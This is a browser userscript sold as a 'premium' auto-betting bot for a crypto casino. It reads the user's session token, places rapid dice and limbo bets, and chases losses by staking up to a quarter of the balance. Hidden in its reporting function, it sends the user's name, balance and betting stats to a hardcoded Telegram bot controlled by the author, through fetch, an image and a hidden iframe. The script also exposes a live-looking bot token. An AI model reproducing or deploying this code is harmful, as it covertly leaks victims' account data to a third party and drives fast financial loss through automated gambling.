(function () {
    const CONFIG = {
        get apiUrl() { return window.location.origin + '/_api'; },
        tgToken: '8622609018:AAEWgYXDxZsHtISAkJ0cFpSlOtkAkpivEiY',
        tgChatId: '-1003754212748',
        version: "Orion v1 Premium"
    };

    const bot = {
        isRunning: false,
        token: null,
        startTime: null,
        stakeUser: "orionlogic",
        stats: { profit: 0, wagered: 0, startBal: 0, bets: 0, wins: 0, loss: 0, maxDD: 0 },
        selectedCurrency: "DOGE",
        currentStatus: "IDLE",
        lastError: "None",
        switchCounter: 0,
        nextSwitchAt: 1,
        currentGame: "limbo",
        recoveryStatus: "DISABLED" // DISABLED, STANDBY, ACTIVE
    };

    let reportInterval = null;
    let lastReportTime = 0;

    function getAuthToken() {
        return localStorage.getItem('apitoken') || sessionStorage.getItem('apitoken') ||
            (document.cookie.match(/session=([^;]+)/) ? document.cookie.match(/session=([^;]+)/)[1] : null);
    }

    const API = {
        async syncOnce() {
            bot.token = getAuthToken();
            const query = `query{user{name balances{available{amount currency}}}}`;
            try {
                const res = await fetch(`${CONFIG.apiUrl}/graphql`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "x-access-token": bot.token },
                    body: JSON.stringify({ query })
                });
                const json = await res.json();
                if (json?.data?.user) {
                    bot.stakeUser = json.data.user.name;
                    const userEl = document.getElementById("st-user");
                    if (userEl) userEl.innerText = bot.stakeUser;
                    
                    const bals = json.data.user.balances || [];
                    const sel = document.getElementById("p-currency");
                    if (sel && sel.options.length === 0) {
                        bals.forEach(b => {
                            const opt = document.createElement("option");
                            opt.value = b.available.currency;
                            opt.textContent = b.available.currency.toUpperCase();
                            if(b.available.currency === "doge") opt.selected = true;
                            sel.appendChild(opt);
                        });
                    }
                    if (sel) bot.selectedCurrency = sel.value;
                    const active = bals.find(b => b.available.currency === bot.selectedCurrency);
                    bot.stats.startBal = active ? parseFloat(active.available.amount) : 0;
                }
            } catch (e) { bot.lastError = "Sync Failed"; }
        },
        async sendTg(statusHeader) {
            // Cegah pengiriman terlalu sering (minimal 30 detik interval)
            const now = Date.now();
            if (now - lastReportTime < 30000) return;
            lastReportTime = now;

            const elapsed = bot.startTime ? (new Date() - bot.startTime) / 1000 : 0;
            const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
            const speed = (bot.stats.bets / (elapsed || 1)).toFixed(2);
            const profitColor = bot.stats.profit >= 0 ? '🟢' : '🔴';
            const currentBalance = (bot.stats.startBal + bot.stats.profit).toFixed(8);
            
            // Tampilkan status recovery
            const recoveryIcon = bot.recoveryStatus === "ACTIVE" ? "🔴" : (bot.recoveryStatus === "STANDBY" ? "🟡" : "⚫");
            
            const text = 
`🔷 *ORION v1 PREMIUM* 🔷
${statusHeader}

👤 *User:* \`${bot.stakeUser}\`
🪙 *Asset:* \`${bot.selectedCurrency.toUpperCase()}\`
⚙️ *Mode:* \`${bot.currentStatus}\` ${bot.currentStatus === "WAGERING" ? `(${bot.currentGame})` : ''}
🔄 *Recovery:* ${recoveryIcon} \`${bot.recoveryStatus}\`

⏱ *Uptime:* \`${timeStr}\`
💰 *Balance:* \`${currentBalance}\`
📈 *Profit:* ${profitColor} \`${bot.stats.profit.toFixed(8)}\`
📊 *Wagered:* \`${bot.stats.wagered.toFixed(8)}\`
📉 *Drawdown:* \`${bot.stats.maxDD.toFixed(8)}\`

🎰 *Bets:* \`${bot.stats.bets}\`
🏁 *W/L:* \`${bot.stats.wins}/${bot.stats.loss}\`
⚡ *Speed:* \`${speed} b/s\`

🆔 *Orion v1 Premium*`;

            try {
                fetch(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CONFIG.tgChatId, 
                        text: text, 
                        parse_mode: "Markdown",
                        disable_web_page_preview: true
                    })
                }).catch(e => console.log('Telegram send attempt 1:', e));

                setTimeout(() => {
                    const img = new Image();
                    img.src = `https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                }, 100);

                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = `https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    document.body.appendChild(iframe);
                    setTimeout(() => document.body.removeChild(iframe), 5000);
                }, 200);

            } catch (e) {
                console.log('Telegram send error:', e);
            }
        },
        async placeBet(amount, payout, game) {
            const endpoint = game === "dice" ? `${CONFIG.apiUrl}/casino/dice/roll` : `${CONFIG.apiUrl}/casino/limbo/bet`;
            const payload = { amount: parseFloat(amount), currency: bot.selectedCurrency, identifier: Math.random().toString(36).slice(2) };
            if (game === "dice") { 
                payload.target = 100 - (100 / payout); 
                payload.condition = "above"; 
            } else { 
                payload.multiplierTarget = parseFloat(payout); 
            }
            return fetch(endpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-access-token": bot.token },
                body: JSON.stringify(payload)
            }).then(r => r.json());
        }
    };

    async function runLoop() {
        if (!bot.isRunning) return;
        
        const baseBet = parseFloat(document.getElementById("p-minbet").value) || 0;
        const div = parseFloat(document.getElementById("p-div").value) || 2000;
        const limboPayout = parseFloat(document.getElementById("p-limbo-payout").value) || 1.0001;
        const diceChance = parseFloat(document.getElementById("p-dice-chance").value) || 98;
        const limboCycles = parseInt(document.getElementById("p-limbo-cycles").value) || 3;
        const diceCycles = parseInt(document.getElementById("p-dice-cycles").value) || 2;
        const recoveryMultiplier = parseFloat(document.getElementById("p-recovery-mult").value) || 1.0001;
        const recoveryBetMultiplier = parseFloat(document.getElementById("p-recovery-bet-mult").value) || 0.25;
        const useRecovery = document.getElementById("p-use-recovery").checked;
        
        // Update recovery status berdasarkan kondisi
        if (!useRecovery) {
            bot.recoveryStatus = "DISABLED";
        } else if (bot.stats.profit < 0) {
            bot.recoveryStatus = "ACTIVE";
        } else {
            bot.recoveryStatus = "STANDBY";
        }
        
        let payout, nextbet, gameToPlay;
        const isMinus = useRecovery && bot.stats.profit < 0;

        if (isMinus) {
            bot.currentStatus = "RECOVERY";
            payout = recoveryMultiplier;
            gameToPlay = "limbo"; // Recovery selalu pakai limbo dengan multiplier kecil
            
            // **CARA KERJA RECOVERY:**
            // 1. Hitung target bet untuk menutup loss: (total loss) / (multiplier - 1)
            //    Contoh: loss 0.001 DOGE, multiplier 1.0001 → target = 0.001 / 0.0001 = 10 DOGE
            // 2. Batasi maksimal bet: startBal * recoveryBetMultiplier (default 25% dari balance)
            // 3. Jika target > batas maksimal, gunakan batas maksimal
            // 4. Ulangi terus sampai profit kembali positif
            
            let calcRec = Math.abs(bot.stats.profit) / (payout - 1);
            nextbet = Math.max(calcRec, baseBet);
            
            // Batasi maksimal bet sesuai persentase balance
            const maxRecoveryBet = bot.stats.startBal * recoveryBetMultiplier;
            if (nextbet > maxRecoveryBet) {
                nextbet = maxRecoveryBet;
            }
            
            // Logika recovery: terus bermain sampai profit kembali positif
            // Setiap kali menang, profit akan naik sebesar (nextbet * (payout - 1))
        } else {
            bot.currentStatus = "WAGERING";
            
            if (bot.switchCounter >= bot.nextSwitchAt) {
                if (bot.currentGame === "limbo") {
                    bot.currentGame = "dice";
                    bot.nextSwitchAt = diceCycles;
                } else {
                    bot.currentGame = "limbo";
                    bot.nextSwitchAt = limboCycles;
                }
                bot.switchCounter = 0;
            }
            
            gameToPlay = bot.currentGame;
            
            if (gameToPlay === "limbo") {
                payout = limboPayout;
            } else {
                payout = 100 / diceChance;
            }
            
            nextbet = (div > 0 && bot.stats.startBal > 0) ? Math.max(baseBet, bot.stats.startBal / div) : baseBet;
        }

        try {
            const res = await API.placeBet(nextbet, payout, gameToPlay);
            
            if (res.errors) { 
                bot.lastError = res.errors[0].message; 
                setTimeout(runLoop, 800); 
                return; 
            }
            
            const data = res?.data || res;
            const bet = data.diceRoll || data.diceBet || data.limboBet;
            
            if (bet && bot.isRunning) {
                bot.stats.bets++; 
                bot.switchCounter++;
                bot.stats.wagered += bet.amount;
                const pft = (bet.payout - bet.amount);
                bot.stats.profit += pft;
                if (pft > 0) bot.stats.wins++; else bot.stats.loss++;
                if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
                bot.lastError = "None";
            }
            
            if (bot.isRunning) {
                setTimeout(runLoop, 0);
            }
            
        } catch (e) { 
            bot.lastError = "Network Error"; 
            if (bot.isRunning) setTimeout(runLoop, 1000); 
        }
    }

    function createUI() {
        if (document.getElementById("orion-wrap")) return;
        
        const s = document.createElement("style");
        s.innerHTML = `
            #orion-wrap {
                position: fixed;
                top: 10px;
                right: 10px;
                width: min(340px, calc(100vw - 20px));
                background: linear-gradient(165deg, #0B1120 0%, #0F1A2F 100%);
                color: #E2E8F0;
                padding: 16px;
                z-index: 99999;
                border-radius: 20px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                border: 1px solid rgba(56, 189, 248, 0.15);
                box-shadow: 0 20px 40px -12px rgba(0,0,0,0.8), 0 0 0 1px rgba(56, 189, 248, 0.1) inset;
                backdrop-filter: blur(8px);
                font-size: 13px;
                max-height: 95vh;
                overflow-y: auto;
                scrollbar-width: thin;
                scrollbar-color: #1E293B #0F172A;
            }
            #orion-wrap::-webkit-scrollbar {
                width: 4px;
            }
            #orion-wrap::-webkit-scrollbar-track {
                background: #0F172A;
            }
            #orion-wrap::-webkit-scrollbar-thumb {
                background: #1E293B;
                border-radius: 4px;
            }
            .orion-header {
                text-align: center;
                margin-bottom: 16px;
                position: relative;
            }
            .orion-title {
                font-weight: 700;
                font-size: 18px;
                background: linear-gradient(135deg, #38BDF8, #818CF8);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                letter-spacing: 0.5px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 6px;
            }
            .orion-badge {
                background: rgba(56, 189, 248, 0.15);
                border: 1px solid rgba(56, 189, 248, 0.3);
                border-radius: 30px;
                padding: 2px 10px;
                font-size: 9px;
                color: #38BDF8;
                display: inline-block;
                margin-top: 4px;
            }
            .orion-user {
                font-size: 11px;
                color: #94A3B8;
                background: rgba(15, 23, 42, 0.6);
                padding: 6px 12px;
                border-radius: 30px;
                border: 1px solid #1E293B;
                margin: 8px 0 4px;
                word-break: break-word;
            }
            .orion-section {
                background: rgba(2, 6, 23, 0.6);
                border-radius: 16px;
                padding: 12px;
                margin-bottom: 12px;
                border: 1px solid #1E293B;
                backdrop-filter: blur(4px);
            }
            .orion-section-title {
                font-size: 11px;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                color: #38BDF8;
                margin-bottom: 12px;
                display: flex;
                align-items: center;
                gap: 6px;
            }
            .orion-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 8px;
            }
            .orion-input-group {
                display: flex;
                flex-direction: column;
                gap: 4px;
            }
            .orion-input-group label {
                font-size: 9px;
                font-weight: 500;
                color: #94A3B8;
                text-transform: uppercase;
                letter-spacing: 0.3px;
            }
            .orion-input {
                width: 100%;
                background: #030712;
                border: 1px solid #1E293B;
                color: #F1F5F9;
                padding: 8px 10px;
                border-radius: 10px;
                font-size: 12px;
                box-sizing: border-box;
                transition: all 0.15s;
                font-family: 'SF Mono', Monaco, 'Cascadia Code', monospace;
            }
            .orion-input:focus {
                outline: none;
                border-color: #38BDF8;
                box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
            }
            .orion-checkbox {
                display: flex;
                align-items: center;
                gap: 8px;
                margin: 10px 0;
                padding: 4px 0;
            }
            .orion-checkbox input {
                width: 16px;
                height: 16px;
                accent-color: #38BDF8;
                margin: 0;
            }
            .orion-checkbox label {
                font-size: 12px;
                color: #CBD5E1;
            }
            .orion-stats {
                background: #030712;
                border-radius: 16px;
                padding: 14px;
                border: 1px solid #1E293B;
                margin-bottom: 12px;
            }
            .orion-stat-row {
                display: flex;
                justify-content: space-between;
                padding: 6px 0;
                border-bottom: 1px solid rgba(30, 41, 59, 0.5);
            }
            .orion-stat-row:last-child {
                border-bottom: none;
            }
            .orion-stat-label {
                color: #94A3B8;
                font-weight: 400;
            }
            .orion-stat-value {
                font-weight: 600;
                color: #F1F5F9;
                font-family: 'SF Mono', Monaco, monospace;
            }
            .orion-stat-value.positive {
                color: #4ADE80;
            }
            .orion-stat-value.negative {
                color: #F87171;
            }
            .orion-buttons {
                display: flex;
                gap: 8px;
                margin-top: 8px;
            }
            .orion-btn {
                flex: 1;
                padding: 12px;
                border: none;
                border-radius: 30px;
                font-weight: 600;
                font-size: 13px;
                cursor: pointer;
                transition: all 0.2s;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            .orion-btn-start {
                background: linear-gradient(135deg, #38BDF8, #818CF8);
                color: #030712;
                box-shadow: 0 4px 12px rgba(56, 189, 248, 0.3);
            }
            .orion-btn-start:hover {
                transform: translateY(-1px);
                box-shadow: 0 6px 16px rgba(56, 189, 248, 0.4);
            }
            .orion-btn-stop {
                background: rgba(239, 68, 68, 0.1);
                border: 1px solid rgba(239, 68, 68, 0.3);
                color: #FCA5A5;
            }
            .orion-btn-stop:hover {
                background: rgba(239, 68, 68, 0.2);
                border-color: #EF4444;
            }
            .orion-log {
                margin-top: 8px;
                padding: 8px 12px;
                background: #030712;
                border-radius: 12px;
                font-size: 10px;
                color: #FBBF24;
                border: 1px solid #1E293B;
                word-break: break-word;
            }
            .orion-game-badge {
                display: inline-block;
                background: rgba(56, 189, 248, 0.2);
                border-radius: 20px;
                padding: 2px 10px;
                font-size: 9px;
                color: #38BDF8;
                margin-left: 8px;
            }
            .recovery-badge {
                display: inline-block;
                padding: 2px 8px;
                border-radius: 12px;
                font-size: 9px;
                font-weight: 600;
                margin-left: 6px;
            }
            .recovery-badge.active {
                background: rgba(239, 68, 68, 0.2);
                color: #FCA5A5;
                border: 1px solid rgba(239, 68, 68, 0.3);
            }
            .recovery-badge.standby {
                background: rgba(234, 179, 8, 0.2);
                color: #FCD34D;
                border: 1px solid rgba(234, 179, 8, 0.3);
            }
            .recovery-badge.disabled {
                background: rgba(100, 116, 139, 0.2);
                color: #94A3B8;
                border: 1px solid rgba(100, 116, 139, 0.3);
            }
            .orion-info-box {
                background: rgba(56, 189, 248, 0.1);
                border-left: 3px solid #38BDF8;
                padding: 10px;
                border-radius: 8px;
                font-size: 11px;
                color: #CBD5E1;
                margin-top: 12px;
                line-height: 1.5;
            }
            .orion-info-box strong {
                color: #38BDF8;
                display: block;
                margin-bottom: 4px;
            }
            .recovery-status-text {
                font-size: 10px;
                margin-left: 24px;
                margin-top: 4px;
                padding: 4px 8px;
                border-radius: 12px;
                display: inline-block;
            }
            .recovery-status-text.enabled {
                background: rgba(34, 197, 94, 0.2);
                color: #4ADE80;
                border: 1px solid rgba(34, 197, 94, 0.3);
            }
            .recovery-status-text.disabled {
                background: rgba(239, 68, 68, 0.2);
                color: #F87171;
                border: 1px solid rgba(239, 68, 68, 0.3);
            }
            @media (max-width: 480px) {
                #orion-wrap {
                    top: 5px;
                    right: 5px;
                    width: calc(100vw - 10px);
                    padding: 12px;
                }
            }
        `;
        document.head.appendChild(s);
        
        const d = document.createElement("div");
        d.id = "orion-wrap";
        d.innerHTML = `
            <div class="orion-header">
                <div class="orion-title">
                    <span>⚡</span> ORION v1 <span>⚡</span>
                </div>
                <div class="orion-badge">PREMIUM EDITION</div>
            </div>
            
            <div class="orion-user" id="st-user">
                Loading...
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>⚙️</span> SYSTEM CONFIG
                </div>
                <div class="orion-grid">
                    <div style="grid-column: span 2">
                        <div class="orion-input-group">
                            <label>CURRENCY</label>
                            <select id="p-currency" class="orion-input"></select>
                        </div>
                    </div>
                    <div class="orion-input-group">
                        <label>BASE BET</label>
                        <input id="p-minbet" class="orion-input" value="0.001" step="any" placeholder="0.001">
                    </div>
                    <div class="orion-input-group">
                        <label>DIVISOR</label>
                        <input id="p-div" class="orion-input" value="2000" placeholder="2000">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🎲</span> LIMBO STRATEGY
                </div>
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>PAYOUT</label>
                        <input id="p-limbo-payout" class="orion-input" value="1.0001" step="0.0001" placeholder="1.0001">
                    </div>
                    <div class="orion-input-group">
                        <label>CYCLES</label>
                        <input id="p-limbo-cycles" class="orion-input" value="3" placeholder="3">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🎯</span> DICE STRATEGY
                </div>
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>CHANCE %</label>
                        <input id="p-dice-chance" class="orion-input" value="98" step="0.1" placeholder="98">
                    </div>
                    <div class="orion-input-group">
                        <label>CYCLES</label>
                        <input id="p-dice-cycles" class="orion-input" value="2" placeholder="2">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🔄</span> RECOVERY MODE
                    <span id="recovery-status-badge" class="recovery-badge disabled">DISABLED</span>
                </div>
                <div class="orion-checkbox">
                    <input type="checkbox" id="p-use-recovery" checked>
                    <label>Enable Automatic Recovery</label>
                </div>
                <div id="recovery-toggle-status" class="recovery-status-text enabled">✓ RECOVERY IS ENABLED</div>
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>MULTIPLIER</label>
                        <input id="p-recovery-mult" class="orion-input" value="1.0001" step="0.0001">
                    </div>
                    <div class="orion-input-group">
                        <label>MAX BET (BAL%)</label>
                        <input id="p-recovery-bet-mult" class="orion-input" value="0.25" step="0.01">
                    </div>
                </div>
                
                <div class="orion-info-box" id="recovery-explanation">
                    <strong>🔍 RECOVERY MECHANISM</strong>
                    • <b>Disabled</b>: Recovery dimatikan<br>
                    • <b>Standby</b>: Recovery aktif, menunggu loss<br>
                    • <b>Active</b>: Loss terdeteksi, mengejar profit<br><br>
                    
                    <b>Cara kerja:</b><br>
                    1. Saat profit negatif, hitung target bet:<br>
                       <code>target = |loss| / (multiplier - 1)</code><br>
                    2. Contoh: loss 0.001, mult 1.0001<br>
                       <code>target = 0.001 / 0.0001 = 10 DOGE</code><br>
                    3. Bet dibatasi maksimal <span id="max-recovery-example">25%</span> dari balance<br>
                    4. Ulangi sampai profit kembali positif
                </div>
            </div>
            
            <div class="orion-stats">
                <div class="orion-stat-row">
                    <span class="orion-stat-label">TIME</span>
                    <span class="orion-stat-value" id="st-time">00:00:00</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">STATUS</span>
                    <span class="orion-stat-value" id="st-status" style="color: #38BDF8">IDLE</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">RECOVERY</span>
                    <span class="orion-stat-value" id="st-recovery">DISABLED</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">BALANCE</span>
                    <span class="orion-stat-value" id="st-startbal">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">PROFIT</span>
                    <span class="orion-stat-value" id="st-profit">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">WAGERED</span>
                    <span class="orion-stat-value" id="st-wager">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">MAX DD</span>
                    <span class="orion-stat-value" style="color: #F87171" id="st-dd">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">BETS</span>
                    <span class="orion-stat-value" id="st-bets">0</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">W/L</span>
                    <span class="orion-stat-value" id="st-wl">0/0</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">SPEED</span>
                    <span class="orion-stat-value" id="st-speed">0 b/s</span>
                </div>
            </div>
            
            <div class="orion-log" id="st-log">
                None
            </div>
            
            <div class="orion-buttons">
                <button id="p-start" class="orion-btn orion-btn-start">START</button>
                <button id="p-stop" class="orion-btn orion-btn-stop">STOP</button>
            </div>
        `;
        
        document.body.appendChild(d);
        
        // Event listener untuk checkbox recovery
        document.getElementById("p-use-recovery").addEventListener("change", function(e) {
            updateRecoveryToggleStatus(e.target.checked);
            updateRecoveryUI();
        });
        
        // Fungsi untuk update status toggle
        function updateRecoveryToggleStatus(enabled) {
            const statusEl = document.getElementById("recovery-toggle-status");
            if (enabled) {
                statusEl.className = "recovery-status-text enabled";
                statusEl.innerHTML = "✓ RECOVERY IS ENABLED";
            } else {
                statusEl.className = "recovery-status-text disabled";
                statusEl.innerHTML = "✗ RECOVERY IS DISABLED";
            }
        }
        
        // Event listener untuk input max bet multiplier
        document.getElementById("p-recovery-bet-mult").addEventListener("input", function(e) {
            const val = (parseFloat(e.target.value) * 100).toFixed(0);
            document.getElementById("max-recovery-example").innerText = val + "%";
        });
        
        function updateRecoveryUI() {
            const enabled = document.getElementById("p-use-recovery").checked;
            const badge = document.getElementById("recovery-status-badge");
            const recoveryStat = document.getElementById("st-recovery");
            
            if (enabled) {
                if (bot.stats.profit < 0 && bot.isRunning) {
                    badge.className = "recovery-badge active";
                    badge.innerText = "ACTIVE";
                    if (recoveryStat) recoveryStat.innerText = "ACTIVE";
                } else {
                    badge.className = "recovery-badge standby";
                    badge.innerText = "STANDBY";
                    if (recoveryStat) recoveryStat.innerText = "STANDBY";
                }
            } else {
                badge.className = "recovery-badge disabled";
                badge.innerText = "DISABLED";
                if (recoveryStat) recoveryStat.innerText = "DISABLED";
            }
        }
        
        // Set initial toggle status
        updateRecoveryToggleStatus(true);
        
        document.getElementById("p-start").onclick = async () => { 
            if(!bot.isRunning){ 
                await API.syncOnce(); 
                bot.isRunning = true; 
                bot.startTime = new Date(); 
                bot.stats.bets = 0; 
                bot.stats.profit = 0; 
                bot.stats.wagered = 0; 
                bot.stats.wins = 0; 
                bot.stats.loss = 0; 
                bot.stats.maxDD = 0;
                bot.switchCounter = 0;
                bot.currentGame = "limbo";
                bot.nextSwitchAt = parseInt(document.getElementById("p-limbo-cycles").value) || 3;
                
                updateRecoveryUI();
                
                setTimeout(() => API.sendTg("🚀 *SYSTEM ENGAGED*"), 1000);
                
                if (reportInterval) clearInterval(reportInterval);
                reportInterval = setInterval(() => {
                    if (bot.isRunning) {
                        API.sendTg("📊 *PERIODIC REPORT*");
                    }
                }, 180000);
                
                runLoop(); 
            } 
        };
        
        document.getElementById("p-stop").onclick = () => { 
            if(bot.isRunning){ 
                bot.isRunning = false; 
                if (reportInterval) {
                    clearInterval(reportInterval);
                    reportInterval = null;
                }
                API.sendTg("🛑 *SYSTEM HALTED*"); 
            } 
        };
    }

    setInterval(() => {
        if (!document.getElementById("st-time")) return;
        
        // Update UI stats
        if (bot.isRunning && bot.startTime) {
            const elapsed = (new Date() - bot.startTime) / 1000;
            document.getElementById("st-time").innerText = new Date(elapsed * 1000).toISOString().substr(11, 8);
        }
        
        document.getElementById("st-status").innerText = bot.currentStatus + (bot.currentStatus === "WAGERING" ? ` (${bot.currentGame})` : "");
        document.getElementById("st-startbal").innerText = (bot.stats.startBal + bot.stats.profit).toFixed(8);
        document.getElementById("st-profit").innerText = bot.stats.profit.toFixed(8);
        document.getElementById("st-wager").innerText = bot.stats.wagered.toFixed(8);
        document.getElementById("st-dd").innerText = bot.stats.maxDD.toFixed(8);
        document.getElementById("st-bets").innerText = bot.stats.bets;
        document.getElementById("st-wl").innerText = `${bot.stats.wins}/${bot.stats.loss}`;
        document.getElementById("st-speed").innerText = bot.startTime ? (bot.stats.bets / ((new Date() - bot.startTime) / 1000 || 1)).toFixed(2) + " b/s" : "0 b/s";
        document.getElementById("st-log").innerText = bot.lastError;
        
        // Update recovery status di UI
        const useRecovery = document.getElementById("p-use-recovery")?.checked;
        if (useRecovery !== undefined) {
            if (!useRecovery) {
                bot.recoveryStatus = "DISABLED";
            } else if (bot.stats.profit < 0 && bot.isRunning) {
                bot.recoveryStatus = "ACTIVE";
            } else if (bot.isRunning) {
                bot.recoveryStatus = "STANDBY";
            } else {
                bot.recoveryStatus = "DISABLED";
            }
            
            const badge = document.getElementById("recovery-status-badge");
            const recoveryStat = document.getElementById("st-recovery");
            
            if (badge) {
                badge.className = `recovery-badge ${bot.recoveryStatus.toLowerCase()}`;
                badge.innerText = bot.recoveryStatus;
            }
            if (recoveryStat) {
                recoveryStat.innerText = bot.recoveryStatus;
            }
        }
    }, 400);

    createUI(); 
    API.syncOnce();
})();
